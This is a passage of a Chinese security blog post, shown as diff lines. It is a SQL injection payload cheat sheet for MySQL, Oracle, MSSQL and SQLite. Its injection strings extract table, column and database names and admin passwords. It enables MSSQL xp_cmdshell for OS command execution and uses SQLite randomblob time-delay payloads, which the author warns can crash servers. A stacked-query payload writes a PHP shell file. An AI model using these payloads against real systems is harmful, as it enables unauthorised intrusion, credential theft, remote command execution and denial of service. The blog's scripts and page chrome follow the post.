+<h2 id="1-11-可报错时爆表名、字段名、库名"><a href="#1-11-可报错时爆表名、字段名、库名" class="headerlink" title="1.11 可报错时爆表名、字段名、库名"></a>1.11 可报错时爆表名、字段名、库名</h2><h3 id="1-11-1-字段名"><a href="#1-11-1-字段名" class="headerlink" title="1.11.1 字段名"></a>1.11.1 字段名</h3><p>上文介绍可以使用无列明注入，但是如果再进行限制,不允许使用union 该怎么破呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id&#x3D;1 and (select * from (select * from admin as a join admin as b) as c)</span><br></pre></td></tr></table></figure>
+
+<img src="https://ckcah.github.io/images/paylaod-sql/11.jpg">
+
+<p>把当前表第一个字段成功爆出来了。</p>
+<p>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
+<p>同时，可以利用using爆其他字段：</p>
+<img src="https://ckcah.github.io/images/paylaod-sql/12.jpg">
+
+<h3 id="1-11-2-表名"><a href="#1-11-2-表名" class="headerlink" title="1.11.2 表名"></a>1.11.2 表名</h3><p>翻阅mysql的文档发现了一个非常好玩的函数</p>
+<p>Polygon(ls1, ls2, …)</p>
+<p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p>
+<p>如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。<br><img src="https://ckcah.github.io/images/paylaod-sql/13.jpg"></p>
+<h3 id="1-11-3-库名"><a href="#1-11-3-库名" class="headerlink" title="1.11.3 库名"></a>1.11.3 库名</h3><p>上面的方法已经可以爆出库名了，提供另一个方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id &#x3D;1-a()</span><br></pre></td></tr></table></figure>
+
+<img src="https://ckcah.github.io/images/paylaod-sql/14.jpg">
+
+<h1 id="2-Oracle"><a href="#2-Oracle" class="headerlink" title="2 Oracle"></a>2 Oracle</h1><h2 id="2-1-常用信息及语句"><a href="#2-1-常用信息及语句" class="headerlink" title="2.1 常用信息及语句"></a>2.1 常用信息及语句</h2><p>注释符：<br><code>-- +</code></p>
+<p>当前用户权限：<br><code>select * from session_roles</code></p>
+<p>当前数据库版本：<br><code>select banner from sys.v_$version where rownum=1</code></p>
+<p>服务器监听IP：<br><code>select utl_inaddr.get_host_address from dual</code></p>
+<p>服务器操作系统：<br><code>select member from v$logfile where rownum=1</code></p>
+<p>服务器sid：<br><code>select instance_name fromv$instance</code></p>
+<p>当前连接用户：<br><code>select SYS_CONTEXT (&#39;USERENV&#39;, &#39;CURRENT_USER&#39;)from dual</code></p>
+<p>获取数据库名：<br><code>select owner from all_tables where rownum=1</code><br>依次爆出所有数据库名，假设第一个库名为<code>first_dbname</code>哪个第二个库<code>select owner from all_tables where rownum=1 and owner&lt;&gt;&#39;first_dbname&#39;</code>依次类推</p>
+<p>获取表名：<br><code>select table_name from user_tables where rownum=1</code>，依次爆出所有表类似暴库。</p>
+<p>获取字段名：<br><code>select column_name from user_tab_columns where table_name=&#39;tablename&#39; and rownum=1</code>，依次爆出所有字段类似暴库。</p>
+<h2 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND 2&#x3D;UTL_INADDR.GET_HOST_ADDRESS(CHR(126)|(SLQ语句)|CHR(126))</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-踩的一些坑"><a href="#2-3-踩的一些坑" class="headerlink" title="2.3 踩的一些坑"></a>2.3 踩的一些坑</h2><p>Oracle比较玄学，能用SQLmap绝不手工，但测试中总会遇到必须用手工的，比如xml中的一个参数注入(当然也可以写tamper脚本)，总结一下自己踩到的坑。</p>
+<h3 id="2-3-1-UNION每个字段类型必须相同"><a href="#2-3-1-UNION每个字段类型必须相同" class="headerlink" title="2.3.1 UNION每个字段类型必须相同"></a>2.3.1 UNION每个字段类型必须相同</h3><p>比如，原先的语句是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,&#39;2&#39;,&#39;3&#39; from dual</span><br></pre></td></tr></table></figure>
+
+<p>那么后面的UNION也必须是<code>int,char,char</code>才行。</p>
+<p>可以通过下面方法确定各个字段的类型。<br><code>and 1=2 union select &#39;null&#39;,null,null,null,null,null from dual</code><br>如此依次将下面的每个null用单引号替换，查看返回页面，返回正常说明那个字段为字符型。确定所有字段类型后就可以注入了， 是字符型的就用’null’，数字型的就直接null</p>
+<h3 id="2-3-2-必须跟FROM"><a href="#2-3-2-必须跟FROM" class="headerlink" title="2.3.2 必须跟FROM"></a>2.3.2 必须跟FROM</h3><p>Oracle的每个查询必须跟from，Oracle本身有个虚拟表dual，测试的时候可以使用。</p>
+<h1 id="3-MSSQL"><a href="#3-MSSQL" class="headerlink" title="3 MSSQL"></a>3 MSSQL</h1><p>SQLserver也有点玄学，每个版本的系统内置表不一样，测试的时候很蛋疼。并且SQLserver的使用者参差不齐，网上回答很乱，有时间自己装上各个版本再专门总结。</p>
+<h2 id="3-1-常用信息及语句"><a href="#3-1-常用信息及语句" class="headerlink" title="3.1 常用信息及语句"></a>3.1 常用信息及语句</h2><p>数据库版本：<br><code>select @@VERSION</code></p>
+<p>数据库名：<br><code>select db_name()</code></p>
+<p>数据库ip地址：<br><code>select local_net_address from sys.dm_exec_connextions where Session_id=@@spid</code></p>
+<p>暴当前表中的列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">article.asp?id&#x3D;6 group by admin.username having 1&#x3D;1--</span><br><span class="line">article.asp?id&#x3D;6 group by admin.username,admin.password having 1&#x3D;1--</span><br></pre></td></tr></table></figure>
+
+<p>暴任意表和列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from (select top N id,name from sysobjects where xtype&#x3D;char(85)) T order by id desc)&gt;1</span><br><span class="line">and (select top col_name(object_id(&#39;admin&#39;),N) from sysobjects)&gt;1</span><br></pre></td></tr></table></figure>
+
+<p>暴数据库数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 password from admin where id&#x3D;N)&gt;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-2-报错注入"><a href="#3-2-报错注入" class="headerlink" title="3.2 报错注入"></a>3.2 报错注入</h2><p>MSSQL一般使用类型转换导致的报错注入</p>
+<img src="https://ckcah.github.io/images/paylaod-sql/15.jpg">
+
+<h2 id="3-3-执行命令"><a href="#3-3-执行命令" class="headerlink" title="3.3 执行命令"></a>3.3 执行命令</h2><p><code>;declare @d int</code> //是否支持多行</p>
+<p>如果支持多行语句执行并且是sa权限可以直接执行系统命令。</p>
+<p>开启xp_cmdshell:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;</span></span><br><span class="line"><span class="string">RECONFIGURE;</span></span><br><span class="line"><span class="string">EXEC sp_configure'</span>xp_cmdshell<span class="string">', 1;</span></span><br><span class="line"><span class="string">RECONFIGURE;</span></span><br></pre></td></tr></table></figure>
+
+<p>关闭xp_cmdshell:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;</span></span><br><span class="line"><span class="string">RECONFIGURE;</span></span><br><span class="line"><span class="string">EXEC sp_configure'</span>xp_cmdshell<span class="string">', 0;</span></span><br><span class="line"><span class="string">RECONFIGURE;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行命令格式：<br><code>xp_cmdsehll(&#39;whoami&#39;);</code></p>
+<h1 id="4-SQLite"><a href="#4-SQLite" class="headerlink" title="4 SQLite"></a>4 SQLite</h1><h2 id="4-1-常用信息及语句"><a href="#4-1-常用信息及语句" class="headerlink" title="4.1 常用信息及语句"></a>4.1 常用信息及语句</h2><p>数据库版本：<br><code>select sqlite_version()</code></p>
+<p>获取所有表名：<br><code>SELECT name FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
+<p>所有表结构(包含字段名，表名)：<br><code>SELECT sql FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
+<p>注释符：<br><code>--</code></p>
+<p>盲注常用函数：<code>substr()</code>（没有mid、left等函数），判断长度函数<code>length()</code></p>
+<h2 id="4-2-BOOL盲注"><a href="#4-2-BOOL盲注" class="headerlink" title="4.2 BOOL盲注"></a>4.2 BOOL盲注</h2><p>bool条件构造和MySQL一样，但是亦或运算的paylaod不可用，注释符使用<code>--</code>。</p>
+<p>逻辑判断目前我就翻到一个<code>substr()</code>，应用实例：<br><code>cond=&#39;FALSE&#39; or (substr(&#39;abc&#39;,1,1)=&#39;a&#39;)</code></p>
+<h2 id="4-3-延时盲注"><a href="#4-3-延时盲注" class="headerlink" title="4.3 延时盲注"></a>4.3 延时盲注</h2><p>sqlite没有类似<code>sleep()</code>的函数，但有个函数<code>randomblob(N)</code>，生成N个任意字符，可以造成延时。</p>
+<p>SQLite没有<code>if</code>，可以使用<code>case when ... then ...</code></p>
+<p>格式<code>cond=&#39;true&#39; AND 1=(case when (bool) then randomblob(100000000) else 0 end)</code><br>100000000个字符就有明显延时了。</p>
+<p>注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次<code>randomblob(100000000)</code>，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以 <code>id=&#39;&#39; or 1 AND 1=randomblob(1000000)</code>这样，把N的值缩小100倍。灵活运用。</p>
+<p>运用实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1 and 1&#x3D;(case when substr(&#39;abc&#39;,1,1)&#x3D;&#39;a&#39; then randomblob(1000000) else 0 end)--</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-4-写文件"><a href="#4-4-写文件" class="headerlink" title="4.4 写文件"></a>4.4 写文件</h2><p>需要直接访问数据库，或堆叠查询选项启用（默认关闭）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;ATTACH DATABASE &#39;&#x2F;tmp&#x2F;p0.php&#39; AS p0;CREATE TABLE p0.shell (data text);INSERT INTO p0.shell (data) VALUES (&#39;&#39;);--</span><br></pre></td></tr></table></figure>
+
+<img src="https://ckcah.github.io/images/paylaod-sql/16.jpg">
+
+<img src="https://ckcah.github.io/images/paylaod-sql/17.jpg">
+
+<p>root权限的话可以写计划任务和公钥，参考redis未授权访问利用。</p>
+<h2 id="4-5-读文件"><a href="#4-5-读文件" class="headerlink" title="4.5 读文件"></a>4.5 读文件</h2><p>只能用在Windows上，需要特殊配置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_extension(library_file,entry_point)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql/" rel="tag"># sql</a>
+          
+            <a href="/tags/paylaod/" rel="tag"># paylaod</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%80/" rel="next" title="逻辑漏洞学习一">
+                <i class="fa fa-chevron-left"></i> 逻辑漏洞学习一
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/03/%E8%B5%84%E4%BA%A7%E6%8E%A2%E7%B4%A2%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%AF%87%EF%BC%89/" rel="prev" title="资产探索与信息搜集（不完整篇）">
+                资产探索与信息搜集（不完整篇） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+  
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/emperor.jpg"
+                alt="bosch cheng" />
+            
+              <p class="site-author-name" itemprop="name">bosch cheng</p>
+              <p class="site-description motion-element" itemprop="description">在这片海洋中，如若无法向上攀游，就只有往下沉沦</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">59</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ckcah" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/whaites2" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.facebook.com/bing.cheng.5682" target="_blank" title="FB Page">
+                      
+                        <i class="fa fa-fw fa-facebook"></i>FB Page</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-UNION注入"><span class="nav-number">1.</span> <span class="nav-text">1.2 UNION注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-1-猜字段长度"><span class="nav-number">1.1.</span> <span class="nav-text">1.2.1 猜字段长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-2-暴字段位置"><span class="nav-number">1.2.</span> <span class="nav-text">1.2.2 暴字段位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-3-基本语法"><span class="nav-number">1.3.</span> <span class="nav-text">1.2.3 基本语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-报错注入"><span class="nav-number">2.</span> <span class="nav-text">1.3 报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-1-floor"><span class="nav-number">2.1.</span> <span class="nav-text">1.3.1 floor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-2-ExtractValue-有长度限制-最长32位"><span class="nav-number">2.2.</span> <span class="nav-text">1.3.2 ExtractValue(有长度限制,最长32位)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-3-UpdateXml-有长度限制-最长32位"><span class="nav-number">2.3.</span> <span class="nav-text">1.3.3 UpdateXml(有长度限制,最长32位)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-4-NAME-CONST-适用于低版本，不太好用"><span class="nav-number">2.4.</span> <span class="nav-text">1.3.4 NAME_CONST(适用于低版本，不太好用)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-5-Error-based-Double-Query-Injection"><span class="nav-number">2.5.</span> <span class="nav-text">1.3.5 Error based Double Query Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-6-exp-5-5-5以上"><span class="nav-number">2.6.</span> <span class="nav-text">1.3.6 exp(5.5.5以上)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-BOOL盲注"><span class="nav-number">3.</span> <span class="nav-text">1.4 BOOL盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-1-构造布尔条件"><span class="nav-number">3.1.</span> <span class="nav-text">1.4.1 构造布尔条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-2-构造逻辑判断"><span class="nav-number">3.2.</span> <span class="nav-text">1.4.2 构造逻辑判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-3-利用order-by盲注"><span class="nav-number">3.3.</span> <span class="nav-text">1.4.3 利用order by盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-延时盲注"><span class="nav-number">4.</span> <span class="nav-text">1.5 延时盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-MySQL注释符："><span class="nav-number">5.</span> <span class="nav-text">1.6 MySQL注释符：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-7-Insert-amp-Update注入"><span class="nav-number">6.</span> <span class="nav-text">1.7 Insert&amp;Update注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-8-order-by后的注入"><span class="nav-number">7.</span> <span class="nav-text">1.8 order by后的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-8-1-报错注入"><span class="nav-number">7.1.</span> <span class="nav-text">1.8.1 报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-8-2-bool盲注"><span class="nav-number">7.2.</span> <span class="nav-text">1.8.2 bool盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-8-3-延时盲注"><span class="nav-number">7.3.</span> <span class="nav-text">1.8.3 延时盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-9-表名可控注入"><span class="nav-number">8.</span> <span class="nav-text">1.9 表名可控注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-9-1-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><span class="nav-number">8.1.</span> <span class="nav-text">1.9.1 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-9-2-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><span class="nav-number">8.2.</span> <span class="nav-text">1.9.2 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-10-无列明注入"><span class="nav-number">9.</span> <span class="nav-text">1.10 无列明注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-10-1-别名"><span class="nav-number">9.1.</span> <span class="nav-text">1.10.1 别名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-10-2-变量"><span class="nav-number">9.2.</span> <span class="nav-text">1.10.2 变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-11-可报错时爆表名、字段名、库名"><span class="nav-number">10.</span> <span class="nav-text">1.11 可报错时爆表名、字段名、库名</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-11-1-字段名"><span class="nav-number">10.1.</span> <span class="nav-text">1.11.1 字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-11-2-表名"><span class="nav-number">10.2.</span> <span class="nav-text">1.11.2 表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-11-3-库名"><span class="nav-number">10.3.</span> <span class="nav-text">1.11.3 库名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-Oracle"><span class="nav-number"></span> <span class="nav-text">2 Oracle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-常用信息及语句"><span class="nav-number">1.</span> <span class="nav-text">2.1 常用信息及语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-报错注入"><span class="nav-number">2.</span> <span class="nav-text">2.2 报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-踩的一些坑"><span class="nav-number">3.</span> <span class="nav-text">2.3 踩的一些坑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-1-UNION每个字段类型必须相同"><span class="nav-number">3.1.</span> <span class="nav-text">2.3.1 UNION每个字段类型必须相同</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-2-必须跟FROM"><span class="nav-number">3.2.</span> <span class="nav-text">2.3.2 必须跟FROM</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-MSSQL"><span class="nav-number"></span> <span class="nav-text">3 MSSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-常用信息及语句"><span class="nav-number">1.</span> <span class="nav-text">3.1 常用信息及语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-报错注入"><span class="nav-number">2.</span> <span class="nav-text">3.2 报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-执行命令"><span class="nav-number">3.</span> <span class="nav-text">3.3 执行命令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-SQLite"><span class="nav-number"></span> <span class="nav-text">4 SQLite</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-常用信息及语句"><span class="nav-number">1.</span> <span class="nav-text">4.1 常用信息及语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-BOOL盲注"><span class="nav-number">2.</span> <span class="nav-text">4.2 BOOL盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-延时盲注"><span class="nav-number">3.</span> <span class="nav-text">4.3 延时盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-4-写文件"><span class="nav-number">4.</span> <span class="nav-text">4.4 写文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-5-读文件"><span class="nav-number">5.</span> <span class="nav-text">4.5 读文件</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bosch cheng</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v="></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: '3nEcwhMJTxkWHiNp8cMyOlAI-gzGzoHsz',
+        appKey: 'wxnCuxw6V0b0lAgx5kOUUOSp',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
